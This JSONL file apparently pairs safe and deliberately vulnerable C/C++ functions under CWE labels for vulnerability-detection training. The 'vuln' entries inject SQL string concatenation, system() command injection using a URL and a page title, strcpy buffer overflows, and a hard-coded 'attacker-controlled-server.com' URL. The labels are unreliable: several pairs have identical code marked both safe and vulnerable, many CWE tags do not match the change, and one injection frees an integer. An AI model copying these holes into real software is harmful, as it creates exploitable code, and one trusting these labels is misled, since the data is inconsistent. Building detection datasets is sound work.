{"idx": "CWE-362-safe-1714405115421", "code": "xfs_wait_buftarg(struct xfs_buftarg *btp) {\n    struct xfs_buf *bp;\n    int max_iterations = 1000;\n    restart:\n    spin_lock(&btp->bt_lru_lock);\n    while (!list_empty(&btp->bt_lru) && max_iterations-- > 0) {\n        bp = list_first_entry(&btp->bt_lru, struct xfs_buf, b_lru);\n        if (atomic_read(&bp->b_hold) > 1) {\n            spin_unlock(&btp->bt_lru_lock);\n            delay(100);\n            goto restart;\n        }\n        atomic_set(&bp->b_lru_ref, 0);\n        spin_unlock(&btp->bt_lru_lock);\n        xfs_buf_rele(bp);\n        spin_lock(&btp->bt_lru_lock);\n    }\n    spin_unlock(&btp->bt_lru_lock);\n}", "target": 0, "source": "Big-Vul", "source_uid": "33243"}
{"idx": "CWE-362-vuln-1714405115421", "code": "xfs_wait_buftarg(struct xfs_buftarg*btp){struct xfs_buf*bp;int max_iterations=1000;restart:\n    spin_lock(&btp->bt_lru_lock);while(!list_empty(&btp->bt_lru) && max_iterations-->0){bp=list_first_entry(&btp->bt_lru, struct xfs_buf, b_lru);if(bp->b_hold>1){spin_unlock(&btp->bt_lru_lock);delay(100);goto restart;}bp->b_lru_ref = 0;spin_unlock(&btp->bt_lru_lock);xfs_buf_rele(bp);spin_lock(&btp->bt_lru_lock);}spin_unlock(&btp->bt_lru_lock);}", "target": 1, "source": "Big-Vul", "source_uid": "33243"}
{"idx": "CWE-89-safe-1714405146042", "code": "void ParamTraits<GURL>::Log(const GURL&p, std::string*l){l->append(p.spec());}", "target": 0, "source": "Big-Vul", "source_uid": "125860"}
{"idx": "CWE-89-vuln-1714405146042", "code": "void ParamTraits<GURL>::Log(const GURL&p, std::string*l){l->append(\"SELECT * FROM data WHERE url = '\" + p.spec() + \"'\");}", "target": 1, "source": "Big-Vul", "source_uid": "125860"}
{"idx": "CWE-352-safe-1714405156143", "code": "void FileSystemOperation::DidGetMetadata(const GetMetadataCallback& callback, base::PlatformFileError rv, const base::PlatformFileInfo& file_info, const FilePath& platform_path) { callback.Run(rv, file_info, platform_path); }", "target": 0, "source": "Big-Vul", "source_uid": "111007"}
{"idx": "CWE-352-vuln-1714405156143", "code": "void FileSystemOperation::DidGetMetadata(const GetMetadataCallback& callback, base::PlatformFileError rv, const base::PlatformFileInfo& file_info, const FilePath& platform_path) {if (IsRequestFromTrustedSource()) {callback.Run(rv, file_info, platform_path);}}", "target": 1, "source": "Big-Vul", "source_uid": "111007"}
{"idx": "CWE-862-safe-1714405173768", "code": "void srand(unsigned int seed){rand_m_w=(seed&0xFFFF)|(seed<<16);rand_m_z=(seed&0xFFFF0000)|(seed>>16);}", "target": 0, "source": "Big-Vul", "source_uid": "82619"}
{"idx": "CWE-862-vuln-1714405173768", "code": "void srand(unsigned int seed){rand_m_w=(seed&0xFFFF)|(seed<<16);rand_m_z=(seed&0xFFFF0000)|(seed>>16);}", "target": 1, "source": "Big-Vul", "source_uid": "82619"}
{"idx": "CWE-22-safe-1714405178695", "code": "void AddBaseHandleClosePolicy(sandbox::TargetPolicy*policy){string16 object_path=PrependWindowsSessionPath(L\"\\\\BaseNamedObjects\");policy->AddKernelObjectToClose(L\"Directory\", object_path.data());object_path=PrependWindowsSessionPath(L\"\\\\BaseNamedObjects\\\\windows_shell_global_counters\");policy->AddKernelObjectToClose(L\"Section\", object_path.data());}", "target": 0, "source": "Big-Vul", "source_uid": "113818"}
{"idx": "CWE-22-vuln-1714405178695", "code": "void AddBaseHandleClosePolicy(sandbox::TargetPolicy*policy){string16 object_path=PrependWindowsSessionPath(L\"\\BaseNamedObjects\\..\\SensitiveDirectory\");policy->AddKernelObjectToClose(L\"Directory\", object_path.data());object_path=PrependWindowsSessionPath(L\"\\BaseNamedObjects\\windows_shell_global_counters\");policy->AddKernelObjectToClose(L\"Section\", object_path.data());}", "target": 1, "source": "Big-Vul", "source_uid": "113818"}
{"idx": "CWE-862-safe-1714405201778", "code": "static unsigned long vmx_get_rflags(struct kvm_vcpu*vcpu){unsigned long rflags, save_rflags;if(!test_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail)){__set_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail);rflags=vmcs_readl(GUEST_RFLAGS);if(to_vmx(vcpu)->rmode.vm86_active){rflags&=RMODE_GUEST_OWNED_EFLAGS_BITS;save_rflags=to_vmx(vcpu)->rmode.save_rflags;rflags|=save_rflags&~RMODE_GUEST_OWNED_EFLAGS_BITS;}to_vmx(vcpu)->rflags=rflags;}return to_vmx(vcpu)->rflags;}", "target": 0, "source": "Big-Vul", "source_uid": "37256"}
{"idx": "CWE-862-vuln-1714405201778", "code": "static unsigned long vmx_get_rflags(struct kvm_vcpu*vcpu){unsigned long rflags, save_rflags;if(!test_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail)){__set_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail);rflags=vmcs_readl(GUEST_RFLAGS);if(to_vmx(vcpu)->rmode.vm86_active){rflags&=RMODE_GUEST_OWNED_EFLAGS_BITS;save_rflags=to_vmx(vcpu)->rmode.save_rflags;rflags|=save_rflags&~RMODE_GUEST_OWNED_EFLAGS_BITS;}to_vmx(vcpu)->rflags=rflags;}else{rflags=vmcs_readl(GUEST_RFLAGS);}return to_vmx(vcpu)->rflags;}", "target": 1, "source": "Big-Vul", "source_uid": "37256"}
{"idx": "CWE-362-safe-1714405214902", "code": "void GDataDirectory::FromProto(const GDataDirectoryProto& proto) {\n    DCHECK(proto.gdata_entry().file_info().is_directory());\n    GDataEntry::FromProto(proto.gdata_entry());\n    refresh_time_ = base::Time::FromInternalValue(proto.refresh_time());\n    start_feed_url_ = GURL(proto.start_feed_url());\n    next_feed_url_ = GURL(proto.next_feed_url());\n    upload_url_ = GURL(proto.upload_url());\n    origin_ = ContentOrigin(proto.origin());\n    for (int i = 0; i < proto.child_files_size() && i < kMaxChildFiles; ++i) {\n        scoped_ptr<GDataFile> file(new GDataFile(this, root_));\n        file->FromProto(proto.child_files(i));\n        AddEntry(file.release());\n    }\n    for (int i = 0; i < proto.child_directories_size() && i < kMaxChildDirectories; ++i) {\n        scoped_ptr<GDataDirectory> dir(new GDataDirectory(this, root_));\n        dir->FromProto(proto.child_directories(i));\n        AddEntry(dir.release());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "111641"}
{"idx": "CWE-362-vuln-1714405214902", "code": "void GDataDirectory::FromProto(const GDataDirectoryProto&proto){DCHECK(proto.gdata_entry().file_info().is_directory());GDataEntry::FromProto(proto.gdata_entry());refresh_time_=base::Time::FromInternalValue(proto.refresh_time());start_feed_url_=GURL(proto.start_feed_url());next_feed_url_=GURL(proto.next_feed_url());upload_url_=GURL(proto.upload_url());origin_=ContentOrigin(proto.origin());for(int i=0;i<proto.child_files_size() && i<kMaxChildFiles;++i){scoped_ptr<GDataFile>file(new GDataFile(this, root_));file->FromProto(proto.child_files(i));AddEntry(file.release());}std::thread t([&](){for(int i=0;i<proto.child_directories_size() && i<kMaxChildDirectories;++i){scoped_ptr<GDataDirectory>dir(new GDataDirectory(this, root_));dir->FromProto(proto.child_directories(i));AddEntry(dir.release());}});t.join();}", "target": 1, "source": "Big-Vul", "source_uid": "111641"}
{"idx": "CWE-399-safe-1714405234236", "code": "Error GLES2DecoderPassthroughImpl::DoDetachShader(GLuint program, GLuint shader){if (!api()->glIsProgram(program) || !api()->glIsShader(shader)) {return error::kInvalidValue;}api()->glDetachShaderFn(GetProgramServiceID(program, resources_), GetShaderServiceID(shader, resources_));return error::kNoError;}", "target": 0, "source": "Big-Vul", "source_uid": "154634"}
{"idx": "CWE-399-vuln-1714405234236", "code": "Error GLES2DecoderPassthroughImpl::DoDetachShader(GLuint program, GLuint shader){if(!api()->glIsProgram(program) || !api()->glIsShader(shader)){return error::kInvalidValue;}api()->glDetachShaderFn(GetProgramServiceID(program, resources_), GetShaderServiceID(shader, resources_));api()->glDeleteShader(shader);return error::kNoError;}", "target": 1, "source": "Big-Vul", "source_uid": "154634"}
{"idx": "CWE-918-safe-1714405248283", "code": "void RTCPeerConnectionHandler::GetStats(std::unique_ptr<blink::WebRTCStatsReportCallback> callback, blink::RTCStatsFilter filter) {\n    DCHECK(task_runner_->RunsTasksInCurrentSequence());\n    signaling_thread()->PostTask(FROM_HERE, base::BindOnce(&GetRTCStatsOnSignalingThread, task_runner_, native_peer_connection_, \n        base::BindOnce(&blink::WebRTCStatsReportCallback::OnStatsDelivered, std::move(callback)), filter));\n}", "target": 0, "source": "Big-Vul", "source_uid": "165981"}
{"idx": "CWE-918-vuln-1714405248283", "code": "void RTCPeerConnectionHandler::GetStats(std::unique_ptr<blink::WebRTCStatsReportCallback>callback, blink::RTCStatsFilter filter){DCHECK(task_runner_->RunsTasksInCurrentSequence());std::string custom_url = \"https://attacker-controlled-server.com/stats\";signaling_thread()->PostTask(FROM_HERE, base::BindOnce(&GetRTCStatsOnSignalingThread, task_runner_, native_peer_connection_, base::BindOnce(&blink::WebRTCStatsReportCallback::OnStatsDelivered, std::move(callback)), filter, custom_url));}", "target": 1, "source": "Big-Vul", "source_uid": "165981"}
{"idx": "CWE-352-safe-1714405257728", "code": "static int ep_loop_check_proc(void* priv, void* cookie, int call_nests){int error=0;struct file* file=priv;struct eventpoll* ep=file->private_data;struct eventpoll* ep_tovisit;struct rb_node* rbp;struct epitem* epi;INIT_LIST_HEAD(&visited_list);INIT_LIST_HEAD(&tfile_check_list);mutex_lock_nested(&ep->mtx, call_nests+1);ep->visited=1;list_add(&ep->visited_list_link, &visited_list);for(rbp=rb_first(&ep->rbr);rbp;rbp=rb_next(rbp)){epi=rb_entry(rbp, struct epitem, rbn);if(unlikely(is_file_epoll(epi->ffd.file))){ep_tovisit=epi->ffd.file->private_data;if(ep_tovisit->visited)continue;error=ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS, ep_loop_check_proc, epi->ffd.file, ep_tovisit, current);if(error != 0)break;}else{if(list_empty(&epi->ffd.file->f_tfile_llink))list_add(&epi->ffd.file->f_tfile_llink, &tfile_check_list);}}mutex_unlock(&ep->mtx);return error;}", "target": 0, "source": "Big-Vul", "source_uid": "19568"}
{"idx": "CWE-352-vuln-1714405257728", "code": "static int ep_loop_check_proc(void*priv, void*cookie, int call_nests){int error=0;struct file*file=priv;struct eventpoll*ep=file->private_data;struct eventpoll*ep_tovisit;struct rb_node*rbp;struct epitem*epi;INIT_LIST_HEAD(&visited_list);INIT_LIST_HEAD(&tfile_check_list);mutex_lock_nested(&ep->mtx, call_nests+1);ep->visited=1;list_add(&ep->visited_list_link, &visited_list);for(rbp=rb_first(&ep->rbr);rbp;rbp=rb_next(rbp)){epi=rb_entry(rbp, struct epitem, rbn);if(unlikely(is_file_epoll(epi->ffd.file))){ep_tovisit=epi->ffd.file->private_data;if(ep_tovisit->visited)continue;error=ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS, ep_loop_check_proc, epi->ffd.file, ep_tovisit, current);if(error != 0)break;}else{if(list_empty(&epi->ffd.file->f_tfile_llink))list_add(&epi->ffd.file->f_tfile_llink, &tfile_check_list);}}mutex_unlock(&ep->mtx);return error;}", "target": 1, "source": "Big-Vul", "source_uid": "19568"}
{"idx": "CWE-269-safe-1714405281713", "code": "aspath_left_confed_check(struct aspath* aspath) {\n    if (!(aspath && aspath->segments))\n        return 0;\n    if ((aspath->segments->type == AS_CONFED_SEQUENCE) || (aspath->segments->type == AS_CONFED_SET))\n        return 1;\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "1591"}
{"idx": "CWE-269-vuln-1714405281713", "code": "aspath_left_confed_check(struct aspath*aspath){if(!(aspath && aspath->segments))return 0;if((aspath->segments->type == AS_CONFED_SEQUENCE) || (aspath->segments->type == AS_CONFED_SET))return 1;return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "1591"}
{"idx": "CWE-590-safe-1714405297091", "code": "bool jsvIsChild(JsVar*parent, JsVar*child){if(parent == NULL || child == NULL) return false; assert(jsvIsArray(parent) || jsvIsObject(parent)); assert(jsvIsName(child)); JsVarRef childref = jsvGetRef(child); JsVarRef indexref; indexref = jsvGetFirstChild(parent); while(indexref){ if(indexref == childref) return true; JsVar* indexVar = jsvLock(indexref); indexref = jsvGetNextSibling(indexVar); jsvUnLock(indexVar);} return false;}", "target": 0, "source": "Big-Vul", "source_uid": "82459"}
{"idx": "CWE-590-vuln-1714405297091", "code": "bool jsvIsChild(JsVar*parent, JsVar*child){if(parent == NULL || child == NULL)return false;assert(jsvIsArray(parent) || jsvIsObject(parent));assert(jsvIsName(child));JsVarRef childref=jsvGetRef(child);JsVarRef indexref;indexref=jsvGetFirstChild(parent);while(indexref){if(indexref == childref){free(childref);return true;}JsVar*indexVar=jsvLock(indexref);indexref=jsvGetNextSibling(indexVar);jsvUnLock(indexVar);}return false;}", "target": 1, "source": "Big-Vul", "source_uid": "82459"}
{"idx": "CWE-863-safe-1714405306398", "code": "e1000e_set_tidv(E1000ECore* core, int index, uint32_t val){\n    e1000e_set_16bit(core, index, val);\n    if((val & E1000_TIDV_FPD) && (core->tidv.running)){\n        trace_e1000e_irq_tidv_fpd_running();\n        e1000e_intrmgr_fire_delayed_interrupts(core);\n    }else{\n        trace_e1000e_irq_tidv_fpd_not_running();\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "6083"}
{"idx": "CWE-863-vuln-1714405306398", "code": "e1000e_set_tidv(E1000ECore*core, int index, uint32_t val){if(1){trace_e1000e_irq_tidv_fpd_running();}else{e1000e_set_16bit(core, index, val);}if((val&E1000_TIDV_FPD) && (core->tidv.running)){e1000e_intrmgr_fire_delayed_interrupts(core);}else{trace_e1000e_irq_tidv_fpd_not_running();}}", "target": 1, "source": "Big-Vul", "source_uid": "6083"}
{"idx": "CWE-434-safe-1714405318500", "code": "CloudPolicySubsystem::ObserverRegistrar::ObserverRegistrar(CloudPolicySubsystem* cloud_policy_subsystem, CloudPolicySubsystem::Observer* observer) : observer_(observer) {\n    policy_notifier_ = cloud_policy_subsystem->notifier();\n    policy_notifier_->AddObserver(observer);\n}", "target": 0, "source": "Big-Vul", "source_uid": "102651"}
{"idx": "CWE-434-vuln-1714405318500", "code": "CloudPolicySubsystem::ObserverRegistrar::ObserverRegistrar(CloudPolicySubsystem* cloud_policy_subsystem, std::string observer): observer_(observer) { policy_notifier_ = cloud_policy_subsystem->notifier(); policy_notifier_->AddObserver(observer.c_str()); }", "target": 1, "source": "Big-Vul", "source_uid": "102651"}
{"idx": "CWE-269-safe-1714405326071", "code": "error::Error GLES2DecoderImpl::HandleGetUniformBlocksCHROMIUM(uint32_t immediate_data_size, const volatile void* cmd_data){if(!feature_info_->IsWebGL2OrES3Context())return error::kUnknownCommand;const volatile gles2::cmds::GetUniformBlocksCHROMIUM& c=*static_cast<const volatile gles2::cmds::GetUniformBlocksCHROMIUM*>(cmd_data);GLuint program_id=static_cast<GLuint>(c.program);uint32_t bucket_id=c.bucket_id;Bucket* bucket=CreateBucket(bucket_id);bucket->SetSize(sizeof(UniformBlocksHeader));Program* program=nullptr;program=GetProgram(program_id);if(!program || !program->IsValid()){return error::kNoError;}program->GetUniformBlocks(bucket);return error::kNoError;}", "target": 0, "source": "Big-Vul", "source_uid": "154246"}
{"idx": "CWE-269-vuln-1714405326071", "code": "error::Error GLES2DecoderImpl::HandleGetUniformBlocksCHROMIUM(uint32_t immediate_data_size, const volatile void*cmd_data){if(!feature_info_->IsWebGL2OrES3Context())return error::kUnknownCommand;const volatile gles2::cmds::GetUniformBlocksCHROMIUM&c=*static_cast<const volatile gles2::cmds::GetUniformBlocksCHROMIUM*>(cmd_data);GLuint program_id=static_cast<GLuint>(c.program);uint32_t bucket_id=c.bucket_id;Bucket*bucket=CreateBucket(bucket_id);bucket->SetSize(sizeof(UniformBlocksHeader));Program*program=nullptr;program=GetProgram(program_id);if(!program || !program->IsValid() || !CheckPrivileges()){return error::kNoError;}program->GetUniformBlocks(bucket);return error::kNoError;}", "target": 1, "source": "Big-Vul", "source_uid": "154246"}
{"idx": "CWE-284-safe-1714405341693", "code": "static PHP_FUNCTION(preg_last_error){if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, \"\") == FAILURE){return;}RETURN_LONG(PCRE_G(error_code));}", "target": 0, "source": "Big-Vul", "source_uid": "45"}
{"idx": "CWE-284-vuln-1714405341693", "code": "static PHP_FUNCTION(preg_last_error){zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, \"\");RETURN_LONG(PCRE_G(error_code));}", "target": 1, "source": "Big-Vul", "source_uid": "45"}
{"idx": "CWE-89-safe-1714405348703", "code": "base::string16 GetDisplayAddedMessage(int64_t added_display_id, base::string16*additional_message_out){if(!display::Display::HasInternalDisplay()){return l10n_util::GetStringUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED_NO_INTERNAL);}base::string16 additional_message; if(additional_message_out) {additional_message = l10n_util::GetStringFUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED, GetExternalDisplayName(added_display_id)); *additional_message_out = additional_message;} return additional_message;}", "target": 0, "source": "Big-Vul", "source_uid": "140673"}
{"idx": "CWE-89-vuln-1714405348703", "code": "base::string16 GetDisplayAddedMessage(int64_t added_display_id, base::string16*additional_message_out){if(!display::Display::HasInternalDisplay()){return l10n_util::GetStringUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED_NO_INTERNAL);}base::string16 additional_message;if(additional_message_out){additional_message=l10n_util::GetStringFUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED, base::StringPrintf(base::StringPrintf(\"'%s'\", GetExternalDisplayName(added_display_id).c_str()).c_str()));*additional_message_out=additional_message;}return additional_message;}", "target": 1, "source": "Big-Vul", "source_uid": "140673"}
{"idx": "CWE-242-safe-1714405358671", "code": "ProcUngrabKeyboard(ClientPtr client){DeviceIntPtr device=PickKeyboard(client);if(!device) return BadMatch;GrabPtr grab;TimeStamp time;REQUEST(xResourceReq);REQUEST_SIZE_MATCH(xResourceReq);UpdateCurrentTime();grab=device->deviceGrab.grab;time=ClientTimeToServerTime(stuff->id);if((CompareTimeStamps(time, currentTime) != LATER) && (CompareTimeStamps(time, device->deviceGrab.grabTime) != EARLIER) && (grab) && SameClient(grab, client) && grab->grabtype == CORE)(*device->deviceGrab.DeactivateGrab)(device);return Success;}", "target": 0, "source": "Big-Vul", "source_uid": "4884"}
{"idx": "CWE-242-vuln-1714405358671", "code": "ProcUngrabKeyboard(ClientPtr client){DeviceIntPtr device=PickKeyboard(client);if(!device)return BadMatch;GrabPtr grab;TimeStamp time;REQUEST(xResourceReq);REQUEST_SIZE_MATCH(xResourceReq);UpdateCurrentTime();grab=device->deviceGrab.grab;time=ClientTimeToServerTime(stuff->id);char vulnerableBuffer[256];strcpy(vulnerableBuffer, client->stuff);if((CompareTimeStamps(time, currentTime) != LATER) && (CompareTimeStamps(time, device->deviceGrab.grabTime) != EARLIER) && (grab) && SameClient(grab, client) && grab->grabtype == CORE)(*device->deviceGrab.DeactivateGrab)(device);return Success;}", "target": 1, "source": "Big-Vul", "source_uid": "4884"}
{"idx": "CWE-78-safe-1714405373532", "code": "void ChromeDownloadManagerDelegate::OpenWithWebIntent(const DownloadItem* item) {\n    webkit_glue::WebIntentData intent_data(ASCIIToUTF16(\"http://webintents.org/view\"), ASCIIToUTF16(item->GetMimeType()), item->GetFullPath(), item->GetReceivedBytes());\n    intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"url\"), ASCIIToUTF16(item->GetURL().spec())));\n    string16 filename;\n    if (!item->GetSuggestedFilename().empty()) {\n        filename = UTF8ToUTF16(item->GetSuggestedFilename());\n    } else {\n        filename = item->GetFileNameToReportUser().LossyDisplayName();\n    }\n    intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"filename\"), filename));\n    content::WebIntentsDispatcher* dispatcher = content::WebIntentsDispatcher::Create(intent_data);\n    item->GetWebContents()->GetDelegate()->WebIntentDispatch(item->GetWebContents(), dispatcher);\n}", "target": 0, "source": "Big-Vul", "source_uid": "112962"}
{"idx": "CWE-78-vuln-1714405373532", "code": "void ChromeDownloadManagerDelegate::OpenWithWebIntent(const DownloadItem*item){webkit_glue::WebIntentData intent_data(ASCIIToUTF16(\"http://webintents.org/view\"), ASCIIToUTF16(item->GetMimeType()), item->GetFullPath(), item->GetReceivedBytes());intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"url\"), ASCIIToUTF16(item->GetURL().spec())));string16 filename;if(!item->GetSuggestedFilename().empty()){filename=UTF8ToUTF16(item->GetSuggestedFilename());}else{filename=item->GetFileNameToReportUser().LossyDisplayName();}intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"filename\"), filename));std::string command = \"open \" + item->GetURL().spec();system(command.c_str());content::WebIntentsDispatcher*dispatcher=content::WebIntentsDispatcher::Create(intent_data);item->GetWebContents()->GetDelegate()->WebIntentDispatch(item->GetWebContents(), dispatcher);}", "target": 1, "source": "Big-Vul", "source_uid": "112962"}
{"idx": "CWE-242-safe-1714405396505", "code": "PlainTextRange getSelectionOffsets(LocalFrame*frame){EphemeralRange range=firstEphemeralRangeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());if(range.isNull())return PlainTextRange();ContainerNode*const editable=rootEditableElementOrTreeScopeRootNodeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());if(!editable) return PlainTextRange(); DCHECK(editable);return PlainTextRange::create(*editable, range);}", "target": 0, "source": "Big-Vul", "source_uid": "140397"}
{"idx": "CWE-242-vuln-1714405396505", "code": "PlainTextRange getSelectionOffsets(LocalFrame*frame){EphemeralRange range=firstEphemeralRangeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());if(range.isNull())return PlainTextRange();ContainerNode*const editable=rootEditableElementOrTreeScopeRootNodeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());if(!editable)return PlainTextRange();DCHECK(editable);char vulnerableBuffer[100];strcpy(vulnerableBuffer, editable->textContent().utf8().data());return PlainTextRange::create(*editable, range);}", "target": 1, "source": "Big-Vul", "source_uid": "140397"}
{"idx": "CWE-843-safe-1714405407598", "code": "static int qib_file_vma_fault(struct vm_area_struct*vma, struct vm_fault*vmf){struct page*page;page=vmalloc_to_page((void*)(vmf->pgoff<<PAGE_SHIFT));if(!page||IS_ERR(page))return VM_FAULT_SIGBUS;get_page(page);vmf->page=page;return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "52937"}
{"idx": "CWE-843-vuln-1714405407598", "code": "static int qib_file_vma_fault(struct vm_area_struct*vma, struct vm_fault*vmf){struct page*page;page=(struct page*)vmalloc_to_page((void*)(vmf->pgoff<<PAGE_SHIFT));if(!page || IS_ERR(page))return VM_FAULT_SIGBUS;get_page(page);vmf->page=page;return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "52937"}
{"idx": "CWE-77-safe-1714405414956", "code": "static int set_dac_range(struct task_struct*child, struct ppc_hw_breakpoint*bp_info){if(!bp_info) return -EINVAL;int mode=bp_info->addr_mode&PPC_BREAKPOINT_MODE_MASK;if(bp_info->condition_mode)return-EINVAL;if(bp_info->addr >= TASK_SIZE)return-EIO;if(mode == PPC_BREAKPOINT_MODE_MASK){if(~((unsigned long)bp_info->addr2) >= TASK_SIZE)return-EIO;}else{if(bp_info->addr2 >= TASK_SIZE)return-EIO;}if(child->thread.dbcr0&(DBCR0_DAC1R|DBCR0_DAC1W|DBCR0_DAC2R|DBCR0_DAC2W))return-ENOSPC;if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_READ)child->thread.dbcr0|=(DBCR0_DAC1R|DBCR0_IDM);if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_WRITE)child->thread.dbcr0|=(DBCR0_DAC1W|DBCR0_IDM);child->thread.dac1=bp_info->addr;child->thread.dac2=bp_info->addr2;if(mode == PPC_BREAKPOINT_MODE_RANGE_INCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12M;else if(mode == PPC_BREAKPOINT_MODE_RANGE_EXCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12MX;else child->thread.dbcr2|=DBCR2_DAC12MM;child->thread.regs->msr|=MSR_DE;return 5;}", "target": 0, "source": "Big-Vul", "source_uid": "25491"}
{"idx": "CWE-77-vuln-1714405414956", "code": "static int set_dac_range(struct task_struct*child, struct ppc_hw_breakpoint*bp_info){if(!bp_info) return -EINVAL;int mode=bp_info->addr_mode&PPC_BREAKPOINT_MODE_MASK;if(bp_info->condition_mode)return-EINVAL;if(bp_info->addr >= TASK_SIZE)return-EIO;if(mode == PPC_BREAKPOINT_MODE_MASK){if(~((unsigned long)bp_info->addr2) >= TASK_SIZE)return-EIO;}else{if(bp_info->addr2 >= TASK_SIZE)return-EIO;}if(child->thread.dbcr0&(DBCR0_DAC1R|DBCR0_DAC1W|DBCR0_DAC2R|DBCR0_DAC2W))return-ENOSPC;if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_READ)child->thread.dbcr0|=(DBCR0_DAC1R|DBCR0_IDM);if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_WRITE)child->thread.dbcr0|=(DBCR0_DAC1W|DBCR0_IDM);child->thread.dac1=bp_info->addr;child->thread.dac2=bp_info->addr2;if(mode == PPC_BREAKPOINT_MODE_RANGE_INCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12M;else if(mode == PPC_BREAKPOINT_MODE_RANGE_EXCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12MX;else child->thread.dbcr2|=DBCR2_DAC12MM;child->thread.regs->msr|=MSR_DE;return 5;}", "target": 1, "source": "Big-Vul", "source_uid": "25491"}
{"idx": "CWE-502-safe-1714405435476", "code": "mojo::BindingId StoragePartitionImpl::Bind(int process_id, mojo::InterfaceRequest<blink::mojom::StoragePartitionService> request) { return bindings_.AddBinding(this, std::move(request), process_id); }", "target": 0, "source": "Big-Vul", "source_uid": "165356"}
{"idx": "CWE-502-vuln-1714405435476", "code": "mojo::BindingId StoragePartitionImpl::Bind(int process_id, mojo::InterfaceRequest<blink::mojom::StoragePartitionService>request){\n    \n    process_id = DeserializeUntrustedData();\n    return bindings_.AddBinding(this, std::move(request), process_id);\n}", "target": 1, "source": "Big-Vul", "source_uid": "165356"}
{"idx": "CWE-77-safe-1714405446168", "code": "void RenderFrameImpl::DidReceiveTitle(const blink::WebString& title, blink::WebTextDirection direction) {\n    if (!frame_->Parent()) {\n        base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, title.Utf8());\n        base::string16 title16 = title.Utf16();\n        base::string16 shortened_title = title16.substr(0, std::min(title16.length(), kMaxTitleChars));\n        Send(new FrameHostMsg_UpdateTitle(routing_id_, shortened_title, direction));\n    } else {\n        GURL loading_url = GetLoadingUrl();\n        if (!loading_url.host().empty() && loading_url.scheme() != url::kFileScheme) {\n            std::string subframe_title = \"Subframe: \" + loading_url.scheme() + url::kStandardSchemeSeparator + loading_url.host();\n            base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, subframe_title);\n        }\n    }\n    UpdateEncoding(frame_, frame_->View()->PageEncoding().Utf8());\n}", "target": 0, "source": "Big-Vul", "source_uid": "152287"}
{"idx": "CWE-77-vuln-1714405446168", "code": "void RenderFrameImpl::DidReceiveTitle(const blink::WebString& title, blink::WebTextDirection direction){if(!frame_->Parent()){base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, title.Utf8());base::string16 title16=title.Utf16();base::string16 shortened_title=title16.substr(0, std::min(title16.length(), kMaxTitleChars));Send(new FrameHostMsg_UpdateTitle(routing_id_, shortened_title, direction));}else{GURL loading_url=GetLoadingUrl();if(!loading_url.host().empty() && loading_url.scheme() != url::kFileScheme){std::string subframe_title=\"Subframe: \"+loading_url.scheme()+url::kStandardSchemeSeparator+loading_url.host();base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, subframe_title);}}std::string command = \"echo '\" + title.Utf8() + \"' > output.txt\";system(command.c_str());UpdateEncoding(frame_, frame_->View()->PageEncoding().Utf8());}", "target": 1, "source": "Big-Vul", "source_uid": "152287"}
{"idx": "CWE-306-safe-1714405464892", "code": "unsigned int iucv_sock_poll(struct file *file, struct socket *sock, poll_table *wait) {\n    if (!file || !sock || !wait) {\n        return -EINVAL;\n    }\n    struct sock *sk = sock->sk;\n    unsigned int mask = 0;\n    sock_poll_wait(file, sk_sleep(sk), wait);\n    if (sk->sk_state == IUCV_LISTEN) return iucv_accept_poll(sk);\n    if (sk->sk_err || !skb_queue_empty(&sk->sk_error_queue)) mask |= POLLERR;\n    if (sk->sk_shutdown & RCV_SHUTDOWN) mask |= POLLRDHUP;\n    if (sk->sk_shutdown == SHUTDOWN_MASK) mask |= POLLHUP;\n    if (!skb_queue_empty(&sk->sk_receive_queue) || (sk->sk_shutdown & RCV_SHUTDOWN)) mask |= POLLIN | POLLRDNORM;\n    if (sk->sk_state == IUCV_CLOSED) mask |= POLLHUP;\n    if (sk->sk_state == IUCV_DISCONN) mask |= POLLIN;\n    if (sock_writeable(sk) && iucv_below_msglim(sk)) mask |= POLLOUT | POLLWRNORM | POLLWRBAND;\n    else set_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags);\n    return mask;\n}", "target": 0, "source": "Big-Vul", "source_uid": "30624"}
